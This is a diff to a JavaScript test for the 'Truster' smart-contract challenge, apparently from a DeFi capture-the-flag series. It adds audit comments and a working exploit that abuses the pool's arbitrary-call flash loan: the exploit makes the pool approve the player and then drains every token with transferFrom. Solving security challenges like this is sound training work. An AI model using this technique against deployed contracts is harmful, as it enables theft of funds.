@@ -23,6 +23,21 @@ describe('[Challenge] Truster', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // @audit TrusterLenderPool.flashLoan() allows arbitrary code execution via target.functionCall(data);
+        // attacker can control both target & data
+        // target uses OpenZeppelin Address https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Address.sol
+        // Address.functionCall() -> target.call{value: value}(data)
+        //
+        // Attacker can use parameters:
+        //   target = token.address
+        //   data   = abi.encodeWithSignature("approve(address,uint256)", player.address, TOKENS_IN_POOL)
+        // to execute token.approve(player.address, TOKENS_IN_POOL) function with pool as msg.sender 
+        // then player can directly call token.transferFrom() to steal all of pool's tokens 
+        let iface = new ethers.utils.Interface(["function approve(address spender, uint256 amount)"]);
+        let encodedFunc = iface.encodeFunctionData("approve", [player.address, TOKENS_IN_POOL]);
+
+        await pool.connect(player).flashLoan(0, player.address, token.address, encodedFunc);
+        await token.connect(player).transferFrom(pool.address, player.address, TOKENS_IN_POOL);
     });
 
     after(async function () {
